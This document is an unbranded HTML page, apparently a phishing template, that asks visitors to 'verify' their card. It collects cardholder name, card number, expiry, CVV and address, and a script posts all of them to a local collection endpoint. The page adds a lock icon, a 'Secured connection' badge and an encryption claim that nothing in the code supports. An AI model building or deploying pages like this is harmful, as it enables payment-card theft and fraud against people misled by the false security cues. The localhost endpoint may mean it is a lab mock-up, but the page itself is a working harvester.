<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verify Your Card - Secure Payment</title>
   <style>
       * { box-sizing: border-box; }
       body {
           font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
           background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
           display: flex;
           justify-content: center;
           align-items: center;
           min-height: 100vh;
           margin: 0;
           color: #333;
       }
       .container {
           background: #fff;
           border-radius: 12px;
           width: 400px;
           padding: 40px 32px;
           box-shadow: 0 20px 60px rgba(0,0,0,0.3);
       }
       .logo {
           text-align: center;
           margin-bottom: 24px;
           font-size: 22px;
           font-weight: 700;
           color: #1a1a2e;
       }
       .lock { color: #2ecc71; margin-right: 6px; }
       h1 { font-size: 20px; margin: 0 0 8px; color: #1a1a2e; }
       .sub { font-size: 13px; color: #666; margin-bottom: 24px; }
       .input-group { margin-bottom: 16px; }
       label { display: block; font-size: 12px; font-weight: 600; color: #555; margin-bottom: 6px; }
       .input-field {
           width: 100%;
           padding: 12px 14px;
           border: 1px solid #ddd;
           border-radius: 8px;
           font-size: 15px;
       }
       .input-field:focus { outline: none; border-color: #3498db; box-shadow: 0 0 0 3px rgba(52,152,219,0.2); }
       .row { display: flex; gap: 12px; }
       .row .input-group { flex: 1; }
       .submit-btn {
           width: 100%;
           padding: 14px;
           background: linear-gradient(135deg, #3498db, #2980b9);
           color: white;
           border: none;
           border-radius: 8px;
           font-size: 16px;
           font-weight: 600;
           cursor: pointer;
           margin-top: 8px;
       }
       .submit-btn:hover { opacity: 0.95; }
       .badge {
           display: inline-flex;
           align-items: center;
           gap: 6px;
           font-size: 11px;
           color: #27ae60;
           margin-top: 16px;
       }
       .footer { font-size: 11px; color: #999; text-align: center; margin-top: 24px; }
   </style>
</head>
<body>
<div class="container">
   <div class="logo"><span class="lock">&#128274;</span> Secure Payment</div>
   <h1>Verify your card</h1>
   <p class="sub">Confirm your details to continue. Your information is protected.</p>
   <form id="cardForm">
       <div class="input-group">
           <label>Cardholder name</label>
           <input type="text" class="input-field" name="cardholder" id="cardholder" placeholder="Name on card" required>
       </div>
       <div class="input-group">
           <label>Card number</label>
           <input type="text" class="input-field" name="cardnumber" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
       </div>
       <div class="row">
           <div class="input-group">
               <label>Expiry</label>
               <input type="text" class="input-field" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
           </div>
           <div class="input-group">
               <label>CVV</label>
               <input type="password" class="input-field" name="cvv" id="cvv" placeholder="123" maxlength="4" required>
           </div>
       </div>
       <div class="input-group">
           <label>Billing address (optional)</label>
           <input type="text" class="input-field" name="address" id="address" placeholder="Street, City, ZIP">
       </div>
       <button type="submit" class="submit-btn">Verify card</button>
   </form>
   <div class="badge">&#10004; Secured connection</div>
   <div class="footer">Protected by industry-standard encryption.</div>
</div>
<script>
document.getElementById("cardForm").addEventListener("submit", function(e) {
   e.preventDefault();
   var n = document.getElementById("cardnumber").value.replace(/\s/g, "");
   if (n.length < 13) { alert("Please enter a valid card number."); return; }
   var data = {
       cardholder: document.getElementById("cardholder").value,
       cardnumber: n,
       expiry: document.getElementById("expiry").value,
       cvv: document.getElementById("cvv").value,
       address: document.getElementById("address").value || ""
   };
   fetch("http://localhost:8000/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
   })
   .then(function(r) { return r.json(); })
   .then(function(d) {
       console.log("Success:", d);
       alert("Verification successful. Thank you.");
   })
   .catch(function(err) {
       console.error("Error:", err);
       alert("Something went wrong. Please try again.");
   });
});
document.getElementById("cardnumber").addEventListener("input", function() {
   var v = this.value.replace(/\D/g, "");
   this.value = v.replace(/(.{4})/g, "$1 ").trim();
});
document.getElementById("expiry").addEventListener("input", function() {
   var v = this.value.replace(/\D/g, "");
   if (v.length >= 2) this.value = v.slice(0,2) + "/" + v.slice(2,4);
   else this.value = v;
});
</script>
</body>
</html>
